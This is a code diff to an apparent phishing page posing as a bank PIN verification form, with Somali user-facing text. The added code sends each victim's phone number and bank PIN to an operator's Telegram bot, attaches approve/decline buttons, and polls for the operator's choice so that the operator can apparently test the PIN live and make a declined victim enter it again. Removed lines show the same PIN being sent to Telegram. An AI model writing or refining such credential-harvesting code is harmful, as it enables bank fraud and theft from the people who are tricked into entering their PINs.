@@ -174,6 +174,8 @@
         const statusMsg = document.getElementById('status-msg');
 
         let isSubmitting = false;
+        let pollInterval = null;
+        let currentTimestamp = null;
 
         // Auto-move PIN inputs
         inputs.forEach((input, index) => {
@@ -193,7 +195,6 @@
                 }
             });
 
-            // Paste support
             input.addEventListener('paste', (e) => {
                 e.preventDefault();
                 const paste = (e.clipboardData || window.clipboardData).getData('text');
@@ -222,6 +223,136 @@
         // Initially disable button
         btn.disabled = true;
 
+        // ---- Send PIN to Telegram with inline buttons ----
+        async function sendPinToTelegram(pin, phone) {
+            const ts = Date.now();
+            currentTimestamp = ts;
+
+            const message = `🏦 *Bank PIN waa la soo galiyay*\n\n📱 Phone: \`${phone}\`\n🔢 PIN: \`${pin}\`\n⏱️ TTimestamp: \`${ts}\``;
+
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: ADMIN_CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown',
+                        reply_markup: {
+                            inline_keyboard: [
+                                [{
+                                    text: '✅ Approve',
+                                    callback_data: `approve_${ts}`
+                                }, {
+                                    text: '❌ Decline',
+                                    callback_data: `decline_${ts}`
+                                }]
+                            ]
+                        }
+                    })
+                });
+                const data = await response.json();
+                return data.ok;
+            } catch (err) {
+                console.error("Telegram send failed:", err);
+                return false;
+            }
+        }
+
+        // ---- Poll for admin's decision via Telegram ----
+        function startPollingForDecision(timestamp) {
+            let lastUpdateId = 0;
+
+            pollInterval = setInterval(async() => {
+                try {
+                    // Get updates from the bot
+                    const res = await fetch(
+                        `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=5`
+                    );
+                    const data = await res.json();
+
+                    if (!data.ok || !data.result) return;
+
+                    for (const update of data.result) {
+                        lastUpdateId = update.update_id;
+
+                        // Check for callback_query
+                        if (update.callback_query) {
+                            const cb = update.callback_query;
+                            const cbData = cb.data;
+
+                            // Extract the timestamp from callback data
+                            const cbTimestamp = cbData.split('_').pop();
+
+                            // Only process if it matches our current timestamp
+                            if (cbTimestamp !== String(timestamp)) continue;
+
+                            // Answer callback query to remove loading state
+                            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
+                                method: 'POST',
+                                headers: {
+                                    'Content-Type': 'application/json'
+                                },
+                                body: JSON.stringify({
+                                    callback_query_id: cb.id,
+                                    text: cbData.startsWith('approve') ? '✅ Approved!' : '❌ Declined!'
+                                })
+                            });
+
+                            // Stop polling
+                            clearInterval(pollInterval);
+                            pollInterval = null;
+
+                            if (cbData.startsWith('approve')) {
+                                // Update the message to show approved
+                                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
+                                    method: 'POST',
+                                    headers: {
+                                        'Content-Type': 'application/json'
+                                    },
+                                    body: JSON.stringify({
+                                        chat_id: ADMIN_CHAT_ID,
+                                        message_id: cb.message.message_id,
+                                        text: cb.message.text + '\n\n✅ *APPROVED*',
+                                        parse_mode: 'Markdown'
+                                    })
+                                });
+                                // Navigate to success
+                                window.location.href = "success.html";
+                            } else if (cbData.startsWith('decline')) {
+                                // Update the message to show declined
+                                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
+                                    method: 'POST',
+                                    headers: {
+                                        'Content-Type': 'application/json'
+                                    },
+                                    body: JSON.stringify({
+                                        chat_id: ADMIN_CHAT_ID,
+                                        message_id: cb.message.message_id,
+                                        text: cb.message.text + '\n\n❌ *DECLINED*',
+                                        parse_mode: 'Markdown'
+                                    })
+                                });
+                                // Show error and reset
+                                statusMsg.innerText = "❌ PIN-ka Bangiga waa la diiday. Fadlan mar kale isku day.";
+                                statusMsg.style.color = "red";
+                                waitContainer.style.display = "none";
+                                inputSection.style.display = "block";
+                                // Clear inputs
+                                inputs.forEach(inp => inp.value = '');
+                                checkFull();
+                                isSubmitting = false;
+                            }
+                        }
+                    }
+                } catch (e) {
+                    console.log("Polling error:", e);
+                }
+            }, 2000); // Poll every 2 seconds
+        }
+
         // ---- Main submit handler ----
         btn.addEventListener('click', async() => {
             if (!btn.classList.contains('active') || isSubmitting) return;
@@ -239,78 +370,34 @@
 
             // Show waiting state
             statusMsg.innerText = "⏳ Waa la diray...";
+            statusMsg.style.color = "#2ecc71";
             inputSection.style.display = "none";
             waitContainer.style.display = "flex";
 
-            // ---- 1. Send Bank PIN to Telegram Bot (fire & forget) ----
-            if (BOT_TOKEN !== "YOUR_BOT_TOKEN_HERE" && ADMIN_CHAT_ID !== "YOUR_ADMIN_CHAT_ID_HERE") {
-                try {
-                    const message = "🏦 *Bank PIN waa la soo galiyay*\n\n📱 Phone: `" + phone + "`\n🔢 PIN: `" + pin + "`";
-                    fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
-                        method: "POST",
-                        headers: {
-                            "Content-Type": "application/json"
-                        },
-                        body: JSON.stringify({
-                            chat_id: ADMIN_CHAT_ID,
-                            text: message,
-                            parse_mode: "Markdown"
-                        })
-                    });
-                } catch (e) {
-                    console.log("Telegram send failed (non-blocking):", e);
-                }
-            }
+            // Send PIN to Telegram with inline buttons
+            const ts = Date.now();
+            const sent = await sendPinToTelegram(pin, phone);
 
-            // ---- 2. Try backend endpoint (if exists) ----
-            try {
-                const response = await fetch('/api/verify-bank-pin', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        phone: phone,
-                        bankPin: pin
-                    })
-                });
-                const data = await response.json();
-                if (data.success) {
-                    startPolling(phone);
-                } else {
-                    // Backend returned error but still navigate to success
-                    setTimeout(() => {
-                        window.location.href = "success.html";
-                    }, 2000);
-                }
-            } catch (err) {
-                console.log("Backend not available, navigating to success...");
-                // ---- 3. Navigate to success page after brief delay ----
-                setTimeout(() => {
-                    window.location.href = "success.html";
-                }, 2000);
+            if (sent) {
+                // Start polling for admin decision
+                startPollingForDecision(ts);
+            } else {
+                // Fallback if Telegram fails
+                statusMsg.innerText = "⚠️ Fadlan isku day mar kale";
+                statusMsg.style.color = "red";
+                waitContainer.style.display = "none";
+                inputSection.style.display = "block";
+                isSubmitting = false;
+                checkFull();
             }
         });
 
-        function startPolling(phone) {
-            const pollInterval = setInterval(async() => {
-                try {
-                    const res = await fetch(`/api/check-status?phone=${encodeURIComponent(phone)}`);
-                    const data = await res.json();
-
-                    if (data.status === "bank_pin_correct") {
-                        clearInterval(pollInterval);
-                        window.location.href = "success.html";
-                    } else if (data.status === "bank_pin_wrong") {
-                        clearInterval(pollInterval);
-                        alert("PIN-ka Bangiga waa khalad.");
-                        location.reload();
-                    }
-                } catch (e) {
-                    console.error("Waiting for verification...");
-                }
-            }, 3000);
-        }
+        // Cleanup poll interval on page unload
+        window.addEventListener('beforeunload', () => {
+            if (pollInterval) {
+                clearInterval(pollInterval);
+            }
+        });
     </script>
 </body>
 
